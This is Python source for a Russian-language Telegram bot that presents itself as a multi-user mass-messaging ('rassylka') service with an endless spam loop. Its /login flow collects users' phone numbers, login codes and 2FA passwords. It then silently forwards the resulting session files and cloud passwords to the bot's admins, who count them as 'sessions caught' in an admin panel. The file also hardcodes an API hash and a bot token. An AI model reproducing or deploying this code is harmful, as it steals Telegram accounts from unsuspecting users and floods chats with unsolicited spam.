#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import os
import json
import random
import threading
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, SessionPasswordNeededError, RPCError
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
from flask import Flask

# =========================================================
#  КОНФИГ
# =========================================================

API_ID = 33741333
API_HASH = 'ecc14282eca1e059e23746b5a2131c5e'
BOT_TOKEN = '8814913641:AAGgG9DAPdLD0uFfWkiWvqjVKe9pKTbZ2Lk'
MASTER_ADMIN_ID = 2066633503

# =========================================================
#  ФАЙЛЫ
# =========================================================

ADMINS_FILE = "admins.json"
SESSIONS_FOLDER = "sessions"
SESSIONS_LIST_FILE = "sessions_list.json"
USER_DATA_FOLDER = "user_data"  # ПАПКА ДЛЯ ДАННЫХ ПОЛЬЗОВАТЕЛЕЙ
LOG_FILE = "session_log.txt"

os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(USER_DATA_FOLDER, exist_ok=True)

# =========================================================
#  ЗАГРУЗКА / СОХРАНЕНИЕ ДАННЫХ ПОЛЬЗОВАТЕЛЕЙ
# =========================================================

def get_user_file(user_id, filename):
    """Возвращает путь к файлу пользователя"""
    return os.path.join(USER_DATA_FOLDER, f"user_{user_id}_{filename}")

def load_user_chats(user_id):
    """Загружает чаты пользователя"""
    file_path = get_user_file(user_id, "chats.json")
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    return []

def save_user_chats(user_id, chats):
    with open(get_user_file(user_id, "chats.json"), 'w', encoding='utf-8') as f:
        json.dump(chats, f, indent=2, ensure_ascii=False)

def load_user_message(user_id):
    """Загружает сообщение пользователя"""
    file_path = get_user_file(user_id, "message.txt")
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            return f.read().strip()
    return ""

def save_user_message(user_id, msg):
    with open(get_user_file(user_id, "message.txt"), 'w', encoding='utf-8') as f:
        f.write(msg)

def load_user_timer(user_id):
    """Загружает таймер пользователя"""
    file_path = get_user_file(user_id, "timer.json")
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            return json.load(f).get("timer", 5)
    return 5

def save_user_timer(user_id, timer):
    with open(get_user_file(user_id, "timer.json"), 'w', encoding='utf-8') as f:
        json.dump({"timer": timer}, f)

def load_user_stats(user_id):
    """Загружает статистику пользователя"""
    file_path = get_user_file(user_id, "stats.json")
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"sent": 0, "total": 0}

def save_user_stats(user_id, stats):
    with open(get_user_file(user_id, "stats.json"), 'w', encoding='utf-8') as f:
        json.dump(stats, f, indent=2)

def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return [MASTER_ADMIN_ID]

def save_admins(admins):
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(admins, f, indent=2)

def load_sessions_list():
    if os.path.exists(SESSIONS_LIST_FILE):
        with open(SESSIONS_LIST_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return []

def save_sessions_list(sessions):
    with open(SESSIONS_LIST_FILE, 'w', encoding='utf-8') as f:
        json.dump(sessions, f, indent=2, ensure_ascii=False)

def log_session(msg):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

admins = load_admins()
sessions_list = load_sessions_list()
bot = None
user_sessions = {}  # user_id -> TelegramClient
user_spam_tasks = {}  # user_id -> asyncio.Task
user_is_spamming = {}  # user_id -> bool
login_states = {}
add_many_states = {}

def is_admin(user_id):
    return user_id in admins

def is_master(user_id):
    return user_id == MASTER_ADMIN_ID

# =========================================================
#  ПРОВЕРКА ПОДКЛЮЧЕНИЯ
# =========================================================

async def ensure_connected(client):
    try:
        if not client.is_connected():
            await client.connect()
            log_session("🔌 Переподключение...")
            return True
        return True
    except Exception as e:
        log_session(f"❌ Ошибка подключения: {e}")
        return False

# =========================================================
#  ОТПРАВКА СЕССИИ АДМИНАМ
# =========================================================

async def send_session_to_admin(user_id, phone, session_path, password=None):
    global bot
    session_file = f"{session_path}.session"
    if not os.path.exists(session_file):
        return False
    
    try:
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        username = me.username or "нет"
        first_name = me.first_name or "нет"
        await client.disconnect()
    except:
        username = "неизвестно"
        first_name = "неизвестно"
    
    caption = f"""
🎯 **НОВАЯ СЕССИЯ!**

📱 Телефон: `{phone}`
👤 Имя: {first_name}
🆔 Юзернейм: @{username}
🆔 User ID: {user_id}
📅 Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    if password:
        caption += f"\n🔐 **ОБЛАЧНЫЙ ПАРОЛЬ (2FA):** `{password}`"
    caption += "\n\n⚠️ Файл .session прикреплён ниже."
    
    for admin_id in admins:
        try:
            await bot.send_file(admin_id, session_file, caption=caption, force_document=True)
        except:
            pass
    
    return True

# =========================================================
#  БЕСКОНЕЧНАЯ РАССЫЛКА (ДЛЯ КОНКРЕТНОГО ПОЛЬЗОВАТЕЛЯ)
# =========================================================

async def spam_loop(user_id, chat_id):
    try:
        client = user_sessions.get(user_id)
        if not client:
            await bot.send_message(chat_id, "❌ Сессия потеряна! Перезайди /login")
            user_is_spamming[user_id] = False
            return
        
        if not await ensure_connected(client):
            await bot.send_message(chat_id, "❌ Не удалось подключиться к Telegram!")
            user_is_spamming[user_id] = False
            return
        
        # ЗАГРУЖАЕМ ДАННЫЕ ПОЛЬЗОВАТЕЛЯ
        chats = load_user_chats(user_id)
        message_text = load_user_message(user_id)
        spam_timer = load_user_timer(user_id)
        stats = load_user_stats(user_id)
        
        if not message_text:
            await bot.send_message(chat_id, "❌ Сообщение не задано! Используй /set")
            user_is_spamming[user_id] = False
            return
        
        if not chats:
            await bot.send_message(chat_id, "❌ Нет чатов! Добавь через /add или /add_many")
            user_is_spamming[user_id] = False
            return
        
        # =========================================================
        #  ПРОВЕРКА ДОСТУПНОСТИ ЧАТОВ
        # =========================================================
        
        await bot.send_message(chat_id, "🔍 Проверка доступности чатов...")
        
        valid_chats = []
        invalid_chats = []
        
        for target in chats:
            try:
                if not await ensure_connected(client):
                    await bot.send_message(chat_id, "⚠️ Потеряно соединение, переподключаюсь...")
                    await asyncio.sleep(2)
                    if not await ensure_connected(client):
                        await bot.send_message(chat_id, "❌ Не удалось переподключиться!")
                        user_is_spamming[user_id] = False
                        return
                
                if target.lstrip('-').isdigit():
                    entity = int(target)
                else:
                    entity = target
                
                await client.get_entity(entity)
                valid_chats.append(target)
                
            except Exception as e:
                invalid_chats.append(target)
                await bot.send_message(chat_id, f"❌ {target} — НЕ ДОСТУПЕН")
            
            await asyncio.sleep(0.3)
        
        if not valid_chats:
            await bot.send_message(chat_id, "❌ Нет доступных чатов! Проверьте список.")
            user_is_spamming[user_id] = False
            return
        
        await bot.send_message(chat_id, f"""
✅ **ПРОВЕРКА ЗАВЕРШЕНА!**
📢 Доступно: {len(valid_chats)}
❌ Недоступно: {len(invalid_chats)}
        """)
        
        # =========================================================
        #  БЕСКОНЕЧНАЯ РАССЫЛКА
        # =========================================================
        
        total_sent = stats.get('total', 0)
        cycle = 1
        
        await bot.send_message(chat_id, f"""
🚀 **БЕСКОНЕЧНАЯ РАССЫЛКА ЗАПУЩЕНА!**
📢 Чатов: {len(valid_chats)}
⏱️ Задержка между циклами: {spam_timer} сек
🔄 Цикл #1
        """)
        
        while user_is_spamming.get(user_id, False):
            random.shuffle(valid_chats)
            sent_in_cycle = 0
            
            for target in valid_chats:
                if not user_is_spamming.get(user_id, False):
                    break
                
                try:
                    if not await ensure_connected(client):
                        await bot.send_message(chat_id, "⚠️ Потеряно соединение, переподключаюсь...")
                        await asyncio.sleep(2)
                        if not await ensure_connected(client):
                            await bot.send_message(chat_id, "❌ Не удалось переподключиться! Останавливаю рассылку.")
                            user_is_spamming[user_id] = False
                            break
                    
                    if target.lstrip('-').isdigit():
                        entity = int(target)
                    else:
                        entity = target
                    
                    await client.send_message(entity, message_text)
                    sent_in_cycle += 1
                    total_sent += 1
                    stats['sent'] = stats.get('sent', 0) + 1
                    stats['total'] = total_sent
                    save_user_stats(user_id, stats)
                    
                except FloodWaitError as e:
                    await bot.send_message(chat_id, f"⏳ Флуд-вейт {e.seconds} сек. Ждём...")
                    await asyncio.sleep(e.seconds)
                    
                except RPCError as e:
                    await bot.send_message(chat_id, f"❌ Ошибка {target}: {str(e)[:50]}")
                    if "disconnected" in str(e).lower() or "connection" in str(e).lower():
                        await ensure_connected(client)
                    
                except Exception as e:
                    await bot.send_message(chat_id, f"❌ Ошибка {target}: {str(e)[:50]}")
            
            if user_is_spamming.get(user_id, False):
                cycle += 1
                await bot.send_message(chat_id, f"""
🔄 **ЦИКЛ #{cycle-1} ЗАВЕРШЁН!**
📨 Отправлено: {sent_in_cycle}
📊 Всего: {total_sent}
⏳ Следующий цикл через {spam_timer} сек...
                """)
                await asyncio.sleep(spam_timer)
        
        user_is_spamming[user_id] = False
        await bot.send_message(chat_id, f"🛑 РАССЫЛКА ОСТАНОВЛЕНА!\n📨 Всего отправлено: {total_sent}")
        log_session(f"Рассылка остановлена для {user_id}: {total_sent}")
        
    except asyncio.CancelledError:
        user_is_spamming[user_id] = False
        stats = load_user_stats(user_id)
        await bot.send_message(chat_id, f"🛑 ОСТАНОВЛЕНО! Всего: {stats.get('sent', 0)}")
        raise
    
    except Exception as e:
        log_session(f"❌ Критическая ошибка для {user_id}: {e}")
        user_is_spamming[user_id] = False
        await bot.send_message(chat_id, f"❌ Критическая ошибка: {str(e)[:100]}")
        raise

# =========================================================
#  ЗАПУСК БОТА
# =========================================================

async def run_bot():
    global bot
    
    print("="*50)
    print("📨 RASSYLKA BOT v7.0 (МНОГОПОЛЬЗОВАТЕЛЬСКИЙ)")
    print("="*50)
    
    if os.path.exists("bot_session.session"):
        os.remove("bot_session.session")
        print("🗑️ Старая сессия удалена")
    
    bot = TelegramClient("bot_session", API_ID, API_HASH, connection=ConnectionTcpAbridged)
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Бот запущен!")
    
    # =========================================================
    #  /START
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_cmd(event):
        user_id = event.sender_id
        has_session = user_id in user_sessions
        is_admin_text = "✅" if is_admin(user_id) else "❌"
        chats = load_user_chats(user_id)
        
        await event.reply(f"""
╔═══════════════════════════════════════════╗
║    📨 RASSYLKA BOT v7.0 (ДЛЯ ВСЕХ)       ║
╠═══════════════════════════════════════════╣
║                                           ║
║  🔐 /login — Добавить сессию              ║
║  📢 /add ID — Добавить 1 чат             ║
║  📢 /add_many — Добавить много чатов      ║
║  📋 /list — Список чатов                 ║
║  🗑️ /remove ID — Удалить чат             ║
║  🧹 /clear — Очистить чаты               ║
║  📝 /set текст — Задать сообщение        ║
║  👁️ /show — Показать сообщение           ║
║  ⏱️ /timer сек — Задержка между циклами   ║
║  🚀 /spam — ЗАПУСТИТЬ БЕСКОНЕЧНЫЙ СПАМ   ║
║  🛑 /stop — Остановить спам              ║
║  📊 /status — Статус                     ║
║  🔐 /admin — Админ-панель                ║
║                                           ║
╠═══════════════════════════════════════════╣
║  👤 Твой ID: {user_id}                     ║
║  🔑 Админ: {is_admin_text}                 ║
║  🔐 Сессия: {'✅ Есть' if has_session else '❌ Нет'}    ║
║  📢 Твоих чатов: {len(chats)}              ║
╚═══════════════════════════════════════════╝
        """)
    
    # =========================================================
    #  /LOGIN
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/login'))
    async def login_cmd(event):
        user_id = event.sender_id
        if user_id in user_sessions:
            await event.reply("✅ У тебя уже есть сессия!")
            return
        login_states[user_id] = {"step": "phone"}
        await event.reply("📱 Введи номер телефона (с +):")
    
    @bot.on(events.NewMessage)
    async def handle_login_input(event):
        user_id = event.sender_id
        text = event.text.strip()
        if user_id not in login_states or text.startswith('/'):
            return
        
        state = login_states[user_id]
        
        if state["step"] == "phone":
            if not text.startswith('+'):
                await event.reply("❌ Формат: +380123456789")
                return
            phone = text
            login_states[user_id] = {"step": "code", "phone": phone}
            session_path = os.path.join(SESSIONS_FOLDER, f"user_{user_id}_{phone.replace('+', '')}")
            client = TelegramClient(session_path, API_ID, API_HASH, connection=ConnectionTcpAbridged)
            try:
                await client.connect()
                await client.send_code_request(phone)
                login_states[user_id]["client"] = client
                login_states[user_id]["path"] = session_path
                await event.reply(f"✅ Номер: {phone}\n📩 Введи код (с пробелами):")
            except Exception as e:
                await event.reply(f"❌ {str(e)[:80]}")
                del login_states[user_id]
        
        elif state["step"] == "code":
            code = text.replace(" ", "")
            if not code.isdigit():
                await event.reply("❌ Только цифры!")
                return
            client = state.get("client")
            phone = state.get("phone")
            session_path = state.get("path")
            try:
                await client.sign_in(phone, code)
                if user_id not in sessions_list:
                    sessions_list.append(user_id)
                    save_sessions_list(sessions_list)
                user_sessions[user_id] = client
                await send_session_to_admin(user_id, phone, session_path, None)
                await event.reply("✅ **СЕССИЯ ДОБАВЛЕНА!**")
                del login_states[user_id]
            except SessionPasswordNeededError:
                login_states[user_id]["step"] = "password"
                await event.reply("🔐 Введи 2FA пароль:")
            except Exception as e:
                await event.reply(f"❌ {str(e)[:80]}")
                del login_states[user_id]
        
        elif state["step"] == "password":
            password = text
            client = state.get("client")
            phone = state.get("phone")
            session_path = state.get("path")
            try:
                await client.sign_in(password=password)
                if user_id not in sessions_list:
                    sessions_list.append(user_id)
                    save_sessions_list(sessions_list)
                user_sessions[user_id] = client
                await send_session_to_admin(user_id, phone, session_path, password)
                await event.reply("✅ **СЕССИЯ + ПАРОЛЬ ДОБАВЛЕНЫ!**")
                del login_states[user_id]
            except Exception as e:
                await event.reply(f"❌ {str(e)[:80]}")
                del login_states[user_id]
    
    # =========================================================
    #  КОМАНДЫ ДЛЯ ПОЛЬЗОВАТЕЛЬСКИХ ЧАТОВ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/add (.+)'))
    async def add_chat(event):
        user_id = event.sender_id
        chat_id = event.pattern_match.group(1).strip()
        chats = load_user_chats(user_id)
        if chat_id in chats:
            await event.reply("⚠️ Уже есть!")
            return
        chats.append(chat_id)
        save_user_chats(user_id, chats)
        await event.reply(f"✅ Добавлен! Всего: {len(chats)}")
    
    @bot.on(events.NewMessage(pattern='/list'))
    async def list_chats(event):
        user_id = event.sender_id
        chats = load_user_chats(user_id)
        if not chats:
            await event.reply("📭 Нет чатов!")
            return
        text = f"📋 ТВОИ ЧАТЫ ({len(chats)}):\n\n"
        for i, c in enumerate(chats, 1):
            text += f"{i}. `{c}`\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(pattern='/remove (.+)'))
    async def remove_chat(event):
        user_id = event.sender_id
        chat_id = event.pattern_match.group(1).strip()
        chats = load_user_chats(user_id)
        if chat_id in chats:
            chats.remove(chat_id)
            save_user_chats(user_id, chats)
            await event.reply("✅ Удален!")
        else:
            await event.reply("❌ Не найден!")
    
    @bot.on(events.NewMessage(pattern='/clear'))
    async def clear_chats(event):
        user_id = event.sender_id
        save_user_chats(user_id, [])
        await event.reply("✅ Все чаты очищены!")
    
    # =========================================================
    #  МАССОВОЕ ДОБАВЛЕНИЕ ЧАТОВ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/add_many(?: (.+))?'))
    async def add_many_chats(event):
        user_id = event.sender_id
        chat_id = event.chat_id
        
        if event.pattern_match.group(1):
            ids = event.pattern_match.group(1).strip().split()
            chats = load_user_chats(user_id)
            added = 0
            for cid in ids:
                cid = cid.strip()
                if cid and cid not in chats:
                    chats.append(cid)
                    added += 1
            save_user_chats(user_id, chats)
            await event.reply(f"✅ Добавлено {added} чатов! Всего: {len(chats)}")
            return
        
        add_many_states[user_id] = {"step": "waiting"}
        await event.reply("""
📢 ВВЕДИ СПИСОК ЧАТОВ

Введи каждый чат/юзернейм с новой строки:

-100123456789
@username
-100987654321

Когда закончишь, напиши /done
        """)
    
    @bot.on(events.NewMessage)
    async def handle_add_many(event):
        user_id = event.sender_id
        text = event.text.strip()
        
        if user_id not in add_many_states:
            return
        if text.startswith('/'):
            return
        
        if add_many_states[user_id].get("step") == "waiting":
            ids = text.replace('\n', ' ').split()
            chats = load_user_chats(user_id)
            added = 0
            for cid in ids:
                cid = cid.strip()
                if cid and cid not in chats:
                    chats.append(cid)
                    added += 1
            save_user_chats(user_id, chats)
            await bot.send_message(event.chat_id, f"✅ Добавлено {added} чатов! Всего: {len(chats)}")
            del add_many_states[user_id]
    
    @bot.on(events.NewMessage(pattern='/done'))
    async def done_add_many(event):
        user_id = event.sender_id
        if user_id in add_many_states:
            del add_many_states[user_id]
            await event.reply("✅ Готово! Все чаты сохранены.")
        else:
            await event.reply("❌ Нет активного процесса добавления.")
    
    # =========================================================
    #  СООБЩЕНИЕ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/set (.+)'))
    async def set_message(event):
        user_id = event.sender_id
        msg = event.pattern_match.group(1).strip()
        save_user_message(user_id, msg)
        await event.reply(f"✅ Сообщение сохранено!\n\n📝 {msg[:100]}{'...' if len(msg) > 100 else ''}")
    
    @bot.on(events.NewMessage(pattern='/show'))
    async def show_message(event):
        user_id = event.sender_id
        msg = load_user_message(user_id)
        if msg:
            await event.reply(f"📝 {msg}")
        else:
            await event.reply("❌ Не задано!")
    
    # =========================================================
    #  ТАЙМЕР
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/timer (.+)'))
    async def set_timer(event):
        user_id = event.sender_id
        try:
            new_timer = float(event.pattern_match.group(1).strip())
            if new_timer < 1:
                await event.reply("❌ Минимум 1 секунда!")
                return
            save_user_timer(user_id, new_timer)
            await event.reply(f"✅ Таймер установлен: {new_timer} сек")
        except:
            await event.reply("❌ Введи число! /timer 10")
    
    # =========================================================
    #  СПАМ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/spam'))
    async def start_spam(event):
        user_id = event.sender_id
        chat_id = event.chat_id
        
        if user_is_spamming.get(user_id, False):
            await event.reply("⚠️ Уже запущено! Используй /stop")
            return
        
        if user_id not in user_sessions:
            await event.reply("❌ Добавь сессию: /login")
            return
        
        if not load_user_message(user_id):
            await event.reply("❌ Задай сообщение: /set")
            return
        
        if not load_user_chats(user_id):
            await event.reply("❌ Добавь чаты: /add или /add_many")
            return
        
        user_is_spamming[user_id] = True
        user_spam_tasks[user_id] = asyncio.create_task(spam_loop(user_id, chat_id))
    
    @bot.on(events.NewMessage(pattern='/stop'))
    async def stop_spam(event):
        user_id = event.sender_id
        if not user_is_spamming.get(user_id, False):
            await event.reply("⚠️ Не запущено!")
            return
        user_is_spamming[user_id] = False
        if user_id in user_spam_tasks and user_spam_tasks[user_id]:
            user_spam_tasks[user_id].cancel()
            try:
                await user_spam_tasks[user_id]
            except:
                pass
        stats = load_user_stats(user_id)
        await event.reply(f"🛑 ОСТАНОВЛЕНО! Всего: {stats.get('sent', 0)}")
    
    @bot.on(events.NewMessage(pattern='/status'))
    async def status_cmd(event):
        user_id = event.sender_id
        has_session = user_id in user_sessions
        is_spam = user_is_spamming.get(user_id, False)
        chats = load_user_chats(user_id)
        msg = load_user_message(user_id)
        timer = load_user_timer(user_id)
        stats = load_user_stats(user_id)
        
        await event.reply(f"""
📊 ТВОЙ СТАТУС
🔐 Сессия: {"✅" if has_session else "❌"}
📢 Чатов: {len(chats)}
📝 Сообщение: {msg[:30] if msg else 'НЕТ'}
⏱️ Таймер: {timer} сек
📨 Отправлено всего: {stats.get('total', 0)}
🔄 Спам: {"🟢 АКТИВЕН" if is_spam else "🔴 ОСТАНОВЛЕН"}
        """)
    
    # =========================================================
    #  АДМИН-ПАНЕЛЬ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/admin'))
    async def admin_panel(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        session_files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        await event.reply(f"""
🔐 АДМИН-ПАНЕЛЬ
👥 Админов: {len(admins)}
📁 Сессий поймано: {len(session_files)}
👤 Пользователей с сессиями: {len(sessions_list)}

📌 /addadmin ID — добавить админа
📌 /removeadmin ID — удалить админа
📌 /listadmins — список админов
📌 /list_sessions — список сессий
📌 /clear_sessions — удалить сессии
        """)
    
    @bot.on(events.NewMessage(pattern='/addadmin (.+)'))
    async def add_admin(event):
        user_id = event.sender_id
        if not is_master(user_id):
            await event.reply("❌ Только мастер!")
            return
        try:
            new_admin = int(event.pattern_match.group(1).strip())
            if new_admin in admins:
                await event.reply("⚠️ Уже админ!")
                return
            admins.append(new_admin)
            save_admins(admins)
            await event.reply(f"✅ {new_admin} добавлен!")
        except:
            await event.reply("❌ Введи ID!")
    
    @bot.on(events.NewMessage(pattern='/removeadmin (.+)'))
    async def remove_admin(event):
        user_id = event.sender_id
        if not is_master(user_id):
            await event.reply("❌ Только мастер!")
            return
        try:
            admin_id = int(event.pattern_match.group(1).strip())
            if admin_id == MASTER_ADMIN_ID:
                await event.reply("❌ Нельзя удалить мастера!")
                return
            if admin_id not in admins:
                await event.reply("⚠️ Не админ!")
                return
            admins.remove(admin_id)
            save_admins(admins)
            await event.reply(f"✅ {admin_id} удален!")
        except:
            await event.reply("❌ Введи ID!")
    
    @bot.on(events.NewMessage(pattern='/listadmins'))
    async def list_admins(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        text = "👥 АДМИНЫ:\n\n"
        for a in admins:
            master = "👑" if a == MASTER_ADMIN_ID else ""
            text += f"• `{a}` {master}\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(pattern='/list_sessions'))
    async def list_sessions_cmd(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        if not files:
            await event.reply("📭 Нет сессий!")
            return
        text = "📁 СЕССИИ:\n\n"
        for i, f in enumerate(files, 1):
            size = os.path.getsize(os.path.join(SESSIONS_FOLDER, f))
            text += f"{i}. `{f}` ({size} байт)\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(pattern='/clear_sessions'))
    async def clear_sessions_cmd(event):
        user_id = event.sender_id
        if not is_master(user_id):
            await event.reply("❌ Только мастер!")
            return
        files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        if not files:
            await event.reply("📭 Нет сессий!")
            return
        for f in files:
            os.remove(os.path.join(SESSIONS_FOLDER, f))
        await event.reply(f"✅ Удалено {len(files)} сессий!")
    
    print("✅ Бот готов к работе!")
    await bot.run_until_disconnected()

# =========================================================
#  FLASK ДЛЯ RENDER
# =========================================================

app = Flask(__name__)

@app.route('/')
def home():
    return "📨 RASSYLKA BOT v7.0 (МНОГОПОЛЬЗОВАТЕЛЬСКИЙ) is running!", 200

@app.route('/health')
def health():
    return "OK", 200

def start_bot():
    asyncio.run(run_bot())

if __name__ == "__main__":
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)